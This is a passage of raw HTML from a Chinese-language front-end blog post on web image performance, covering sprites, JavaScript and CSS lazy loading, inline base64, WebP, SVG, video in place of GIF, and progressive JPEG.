800w,\n/static/2021-07-22-11-18-47-6eac129d72622d0b3dd20aeaca0a7479-b1a91.png 1200w,\n/static/2021-07-22-11-18-47-6eac129d72622d0b3dd20aeaca0a7479-95179.png 1600w,\n/static/2021-07-22-11-18-47-6eac129d72622d0b3dd20aeaca0a7479-d69c7.png 2318w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>可以看到，图片占据了半壁江山。同样，在一篇 2018 年的文章中，也提到了图片在网站中体量的平均占比已经超过了 50%。然而，随着平均加载图片总字节数的增加，图片的请求数却再减少，这也说明网站使用的图片质量和大小正在不断提高。</p>\n<p>所以，如果单纯从加载的字节数这个维度来看性能优化，那么很多时候，优化图片带来的流量收益要远高于优化 JavaScript 脚本和 CSS 样式文件。下面我们就来看看，如何优化图片资源。</p>\n<h3 id="优化请求数"><a href="#%E4%BC%98%E5%8C%96%E8%AF%B7%E6%B1%82%E6%95%B0" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>优化请求数</h3>\n<h4 id="雪碧图"><a href="#%E9%9B%AA%E7%A2%A7%E5%9B%BE" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>雪碧图</h4>\n<p>图片可以合并么？当然。最为常用的图片合并场景就是雪碧图（Sprite）。</p>\n<p>在网站上通常会有很多小的图标，不经优化的话，最直接的方式就是将这些小图标保存为一个个独立的图片文件，然后通过 CSS 将对应元素的背景图片设置为对应的图标图片。这么做的一个重要问题在于，页面加载时可能会同时请求非常多的小图标图片，这就会受到浏览器并发 HTTP 请求数的限制。我见过一个没有使用雪碧图的页面，首页加载时需要发送 20+ 请求来加载图标。将图标合并为一张大图可以实现「20+ → 1」的巨大缩减。</p>\n<p>雪碧图的核心原理在于设置不同的背景偏移量，大致包含两点：</p>\n<ul>\n<li>不同的图标元素都会将 background-url 设置为合并后的雪碧图的 uri；</li>\n<li>不同的图标通过设置对应的 background-position 来展示大图中对应的图标部分。</li>\n</ul>\n<p>你可以用 Photoshop 这类工具自己制作雪碧图。当然比较推荐的还是将雪碧图的生成集成到前端自动化构建工具中，例如在 webpack 中使用 webpack-spritesmith，或者在 gulp 中使用 gulp.spritesmith。它们两者都是基于 spritesmith 这个库，你也可以自己将这个库集成到你喜欢的构建工具中。</p>\n<h4 id="懒加载"><a href="#%E6%87%92%E5%8A%A0%E8%BD%BD" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>懒加载</h4>\n<p>我们知道，一般来说我们访问一个页面，浏览器加载的整个页面其实是要比可视区域大很多的，也是什么我们会提出“首屏”的概念。这就导致其实很多图片是不在首屏中的，如果我们都加载的话，相当于是加载了用户不一定会看到图片。而图片体积一般都不小，这显然是一种流量的浪费。这种场景在一些带图片的长列表或者配图的博客中经常会遇到。</p>\n<p>解决的核心思路就是图片懒加载，尽量只加载用户正在浏览或者即将会浏览到的图片。实现上来说最简单的就是通过监听页面滚动，判断图片是否进入视野，从而真正去加载图片：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="28559594258050300000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`// 方法一：el.offsetTop - document.documentElement.scrollTop <= viewPortHeight\nfunction loadIfNeeded(\\$img) {\n  // viewPortHeight 兼容所有浏览器写法\n  const viewPortHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;\n  const offsetTop = \\$img.offsetTop;\n  const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;\n  const top = offsetTop - scrollTop;\n  if (top <= viewPortHeight) {\n    \\$img.src = \\$img.dataset.src;\n    \\$img.classList.remove(\'lazy\');\n  }\n}\n\n// 方法二：el.getBoundingClientReact().top <= viewPortHeight\nfunction loadIfNeeded(\\$img) {\n  const viewPortHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;\n  const top = \\$img.getBoundingClientRect() && \\$img.getBoundingClientRect().top;\n  if (top <= viewPortHeight) {\n    \\$img.src = \\$img.dataset.src;\n    \\$img.classList.remove(\'lazy\');\n  }\n}\n\n// 方法三：intersectionRatio > 0 && intersectionRatio <= 1\nfunction loadIfNeeded(\\$img) {\n  const io = new IntersectionObserver((ioes) => {\n    ioes.forEach((ioe) => {\n      const el = ioe.target;\n      const intersectionRatio = ioe.intersectionRatio;\n      if (intersectionRatio > 0 && intersectionRatio <= 1) {\n        \\$img.src = \\$img.dataset.src;\n        \\$img.classList.remove(\'lazy\');\n        io.unobserve(el);\n      }\n      el.onload = el.onerror = () => io.unobserve(el);\n    });\n  });\n  io.observe(\\$img);\n}\n\n// 这里使用了 throttle，你可以实现自己的 throttle，也可以使用 lodash\nconst lazy = throttle(function() {\n  const \\$imgList = document.querySelectorAll(\'.lazy\');\n  if (\\$imgList.length === 0) {\n    document.removeEventListener(\'scroll\', lazy);\n    window.removeEventListener(\'resize\', lazy);\n    window.removeEventListener(\'orientationchange\', lazy);\n    return;\n  }\n  \\$imgList.forEach(loadIfNeeded);\n}, 200);\n\ndocument.addEventListener(\'scroll\', lazy);\nwindow.addEventListener(\'resize\', lazy);\nwindow.addEventListener(\'orientationchange\', lazy);`, `28559594258050300000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token comment">// 方法一：el.offsetTop - document.documentElement.scrollTop &lt;= viewPortHeight</span>\n<span class="token keyword">function</span> <span class="token function">loadIfNeeded</span><span class="token punctuation">(</span><span class="token parameter">$img</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token comment">// viewPortHeight 兼容所有浏览器写法</span>\n  <span class="token keyword">const</span> viewPortHeight <span class="token operator">=</span> window<span class="token punctuation">.</span>innerHeight <span class="token operator">||</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientHeight <span class="token operator">||</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>clientHeight<span class="token punctuation">;</span>\n  <span class="token keyword">const</span> offsetTop <span class="token operator">=</span> $img<span class="token punctuation">.</span>offsetTop<span class="token punctuation">;</span>\n  <span class="token keyword">const</span> scrollTop <span class="token operator">=</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>scrollTop <span class="token operator">||</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>scrollTop<span class="token punctuation">;</span>\n  <span class="token keyword">const</span> top <span class="token operator">=</span> offsetTop <span class="token operator">-</span> scrollTop<span class="token punctuation">;</span>\n  <span class="token keyword">if</span> <span class="token punctuation">(</span>top <span class="token operator">&lt;=</span> viewPortHeight<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    $img<span class="token punctuation">.</span>src <span class="token operator">=</span> $img<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>src<span class="token punctuation">;</span>\n    $img<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">\'lazy\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n<span class="token comment">// 方法二：el.getBoundingClientReact().top &lt;= viewPortHeight</span>\n<span class="token keyword">function</span> <span class="token function">loadIfNeeded</span><span class="token punctuation">(</span><span class="token parameter">$img</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">const</span> viewPortHeight <span class="token operator">=</span> window<span class="token punctuation">.</span>innerHeight <span class="token operator">||</span> document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>clientHeight <span class="token operator">||</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>clientHeight<span class="token punctuation">;</span>\n  <span class="token keyword">const</span> top <span class="token operator">=</span> $img<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> $img<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">;</span>\n  <span class="token keyword">if</span> <span class="token punctuation">(</span>top <span class="token operator">&lt;=</span> viewPortHeight<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    $img<span class="token punctuation">.</span>src <span class="token operator">=</span> $img<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>src<span class="token punctuation">;</span>\n    $img<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">\'lazy\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n<span class="token comment">// 方法三：intersectionRatio > 0 &amp;&amp; intersectionRatio &lt;= 1</span>\n<span class="token keyword">function</span> <span class="token function">loadIfNeeded</span><span class="token punctuation">(</span><span class="token parameter">$img</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">const</span> io <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IntersectionObserver</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">ioes</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>\n    ioes<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">ioe</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>\n      <span class="token keyword">const</span> el <span class="token operator">=</span> ioe<span class="token punctuation">.</span>target<span class="token punctuation">;</span>\n      <span class="token keyword">const</span> intersectionRatio <span class="token operator">=</span> ioe<span class="token punctuation">.</span>intersectionRatio<span class="token punctuation">;</span>\n      <span class="token keyword">if</span> <span class="token punctuation">(</span>intersectionRatio <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> intersectionRatio <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        $img<span class="token punctuation">.</span>src <span class="token operator">=</span> $img<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>src<span class="token punctuation">;</span>\n        $img<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">\'lazy\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        io<span class="token punctuation">.</span><span class="token function">unobserve</span><span class="token punctuation">(</span>el<span class="token punctuation">)</span><span class="token punctuation">;</span>\n      <span class="token punctuation">}</span>\n      el<span class="token punctuation">.</span>onload <span class="token operator">=</span> el<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> io<span class="token punctuation">.</span><span class="token function">unobserve</span><span class="token punctuation">(</span>el<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  io<span class="token punctuation">.</span><span class="token function">observe</span><span class="token punctuation">(</span>$img<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n\n<span class="token comment">// 这里使用了 throttle，你可以实现自己的 throttle，也可以使用 lodash</span>\n<span class="token keyword">const</span> lazy <span class="token operator">=</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">const</span> $imgList <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">\'.lazy\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token keyword">if</span> <span class="token punctuation">(</span>$imgList<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    document<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">\'scroll\'</span><span class="token punctuation">,</span> lazy<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    window<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">\'resize\'</span><span class="token punctuation">,</span> lazy<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    window<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">\'orientationchange\'</span><span class="token punctuation">,</span> lazy<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token keyword">return</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n  $imgList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>loadIfNeeded<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\ndocument<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">\'scroll\'</span><span class="token punctuation">,</span> lazy<span class="token punctuation">)</span><span class="token punctuation">;</span>\nwindow<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">\'resize\'</span><span class="token punctuation">,</span> lazy<span class="token punctuation">)</span><span class="token punctuation">;</span>\nwindow<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">\'orientationchange\'</span><span class="token punctuation">,</span> lazy<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>对于页面上的元素只需要将原本的 src 值设置到 data-src 中即可，而 src 可以设置为一个统一的占位图。注意，由于页面滚动、缩放和横竖方向（移动端）都可能会改变可视区域，因此添加了三个监听。</p>\n<p>当然，这是最传统的方法，现代浏览器还提供了一个更先进的 Intersection Observer API 来做这个事，它可以通过更高效的方式来监听元素是否进入视口。考虑兼容性问题，在生产环境中建议使用对应的 polyfill。</p>\n<p>如果想使用懒加载，还可以借助一些已有的工具库，例如 aFarkas/lazysizes、verlok/lazyload、tuupola/lazyload 等。</p>\n<p>在使用懒加载时也有一些注意点：</p>\n<ul>\n<li>首屏可以不需要懒加载，对首屏图片也使用懒加载会延迟图片的展示。</li>\n<li>设置合理的占位图，避免图片加载后的页面“抖动”。</li>\n<li>虽然目前基本所有用户都不会禁用 JavaScript，但还是建议做一些 JavaScript 不可用时的 backup。</li>\n</ul>\n<p>对于占位图这块可以再补充一点。为了更好的用户体验，我们可以使用一个基于原图生成的体积小、清晰度低的图片作为占位图。这样一来不会增加太大的体积，二来会有很好的用户体验。LQIP (Low Quality Image Placeholders) 就是这种技术。目前也已经有了 LQIP 和 SQIP(SVG-based LQIP) 的自动化工具可以直接使用。</p>\n<h4 id="css-中的图片懒加载"><a href="#css-%E4%B8%AD%E7%9A%84%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>CSS 中的图片懒加载</h4>\n<p>除了对于 <code class="language-text">&lt;img&gt;</code> 元素的图片进行来加载，在 CSS 中使用的图片一样可以懒加载，最常见的场景就是 background-url。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="77404047915135480000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`.login {\n  background-url: url(\'/static/img/login.png\');\n}`, `77404047915135480000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="css"\n              >\n                <span class="gatsby-code-button-language">css</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">.login</span> <span class="token punctuation">{</span>\n  <span class="token property">background-url</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>\'/static/img/login.png\'<span class="token punctuation">)</span></span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>\n<p>对于上面这个样式规则，如果不应用到具体的元素，浏览器不会去下载该图片。所以你可以通过切换 className 的方式，放心得进行 CSS 中图片的懒加载。</p>\n<h4 id="内联-base64"><a href="#%E5%86%85%E8%81%94-base64" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>内联 base64</h4>\n<p>还有一种方式是将图片转为 base64 字符串，并将其内联到页面中返回，即将原 url 的值替换为 base64。这样，当浏览器解析到这个的图片 url 时，就不会去请求并下载图片，直接解析 base64 字符串即可。</p>\n<p>但是这种方式的一个缺点在于相同的图片，相比使用二进制，变成 base64 后体积会增大 33%。而全部内联进页面后，也意味着原本可能并行加载的图片信息，都会被放在页面请求中（像当于是串行了）。同时这种方式也不利于复用独立的文件缓存。所以，使用 base64 需要权衡，常用于首屏加载 CRP 或者骨架图上的一些小图标。</p>\n<h3 id="减小图片大小"><a href="#%E5%87%8F%E5%B0%8F%E5%9B%BE%E7%89%87%E5%A4%A7%E5%B0%8F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>减小图片大小</h3>\n<h4 id="使用合适的图片格式"><a href="#%E4%BD%BF%E7%94%A8%E5%90%88%E9%80%82%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用合适的图片格式</h4>\n<p>使用合适的图片格式不仅能帮助你减少不必要的请求流量，同时还可能提供更好的图片体验。</p>\n<p>图片格式是一个比较大的话题，选择合适的格式有利于性能优化。这里我们简单总结一些。</p>\n<ol>\n<li>\n<p>使用 WebP：</p>\n<p>考虑在网站上使用 WebP 格式。在有损与无损压缩上，它的表现都会优于传统（JPEG/PNG）格式。WebP 无损压缩比 PNG 的体积小 26%，webP 的有损压缩比同质量的 JPEG 格式体积小 25-34%。同时 WebP 也支持透明度。下面提供了一种兼容性较好的写法。</p>\n<html><head></head><body><div class="gatsby-code-button-container" data-toaster-id="53776442217401680000" data-toaster-class="gatsby-code-button-toaster" data-toaster-text-class="gatsby-code-button-toaster-text" data-toaster-text="复制成功" data-toaster-duration="3500" onclick="copyToClipboard(`<picture>\n <source type=&quot;image/webp&quot; data-srcset=&quot;/static/img/perf.webp&quot; />\n <source type=&quot;image/jpeg&quot; srcset=&quot;/static/img/perf.jpg&quot; />\n <img data-src=&quot;/static/img/perf.jpg&quot; />\n</picture>`, `53776442217401680000`)">\n              <div class="gatsby-code-button" title="html">\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div></body></html>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>picture</span><span class="token punctuation">></span></span>\n <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image/webp<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/static/img/perf.webp<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image/jpeg<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/static/img/perf.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/static/img/perf.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>picture</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>使用 SVG 应对矢量图场景：</p>\n<p>在一些需要缩放与高保真的情况，或者用作图标的场景下，使用 SVG 这种矢量图非常不错。有时使用 SVG 格式会比相同的 PNG 或 JPEG 更小。</p>\n</li>\n<li>\n<p>使用 video 替代 GIF：</p>\n<p>在兼容性允许的情况下考虑，可以在想要动图效果时使用视频，通过静音（muted）的 video 来代替 GIF。相同的效果下，GIF 比视频（MPEG-4）大 5 ～ 20 倍。Smashing Magazine 上有篇文章[9]详细介绍使用方式。</p>\n</li>\n<li>\n<p>渐进式 JPEG：</p>\n<p>基线 JPEG (baseline JPEG) 会从上往下逐步呈现，类似下面这种：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-22-13-42-05-35021306cfc2c91f321747b8d6073c0c-fa1ac.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 35.77817531305904%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABXklEQVQY02NgZOXl4hUTElcSl9fVNnXW0jMVk1JW1zJW17V294/RN7aSlFPT1DXVNrJz84sxt3YSFldQ1TAEcnXNXRmmz5w9Z97iBQuXLV+7Y+6iVYb6phrqhnpm7ka2/kEJ+YaGlhoaRgaWnkY2fgGJhba2rkBZAwsPM/tAW/9Ehv9g8O/vPyD56c2bQi2DGGNTW0fnuPDIrvSiRBnlQBU1YxPzsKCQ2qjUPE2DEDkFYxOzoKDgUs8Qhj9w8Pfvn58/39699+Dm9SeP7r95++b79Zudyjoa3OzRAW5z58yfYuPaq6Sjw8nm52wxe/7CZi1jqM1o4N8/kEO+ffqkLysrwM+XW1o2fc6icF0DVzUNeWnpkqqqNZt2eiurM2BqgwAg+8fPn4uWL1+yZPH2nbtOnj61e/dOdX1dXkEBK3v78MjgiBAf7DZjdcjv37+9Tc3UGBg1+AWMxYRSwnwA413iCnw7DHQAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 22 13 42 05" title="" data-src="/static/2021-07-22-13-42-05-35021306cfc2c91f321747b8d6073c0c-fee1c.png" data-srcset="/static/2021-07-22-13-42-05-35021306cfc2c91f321747b8d6073c0c-a67b7.png 200w,\n/static/2021-07-22-13-42-05-35021306cfc2c91f321747b8d6073c0c-0b187.png 400w,\n/static/2021-07-22-13-42-05-35021306cfc2c91f321747b8d6073c0c-fee1c.png 800w,\n/static/2021-07-22-13-42-05-35021306cfc2c91f321747b8d6073c0c-fa1ac.png 1118w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>而另一种渐进式 JPEG (progressive JPEG) 则会从模糊到逐渐清晰，使人的感受上会更加平滑。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-22-13-42-25-7fa8c049563260c1a64645c1a1b65188-fa1ac.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 35.77817531305904%; position: relative; bottom: 0; left: 0; background-image: 